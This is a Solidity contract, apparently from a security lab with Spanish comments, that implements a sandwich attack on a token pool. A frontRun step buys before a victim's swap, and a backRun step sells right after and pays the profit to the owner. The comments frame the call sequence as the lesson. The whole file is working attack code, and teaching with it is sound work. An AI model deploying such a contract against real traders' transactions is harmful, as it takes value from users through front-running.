// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IPool {
    function swapExactETHForTokens(uint256 amountOutMin) external payable returns (uint256 amountOut);
    function swapExactTokensForETH(uint256 tokenIn, uint256 amountOutMin) external returns (uint256 amountOut);
}

/// @notice Orquesta el sandwich: el test decide CUÁNDO se llama a cada paso
///         (frontRun, el swap de la víctima, backRun) -- esa secuencia, no
///         este contrato, es la lección de este laboratorio.
contract SandwichAttacker {
    IPool public immutable pool;
    IERC20 public immutable token;
    address public immutable owner;
    uint256 public frontRunTokens;

    constructor(address _pool, address _token) {
        pool = IPool(_pool);
        token = IERC20(_token);
        owner = msg.sender;
    }

    // paso 1 — antes de que la victima confirme
    function frontRun() external payable {
        frontRunTokens = pool.swapExactETHForTokens{value: msg.value}(0);
    }

    // paso 3 — justo despues de que la victima confirme
    function backRun() external {
        token.approve(address(pool), frontRunTokens);
        pool.swapExactTokensForETH(frontRunTokens, 0);
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {}
}
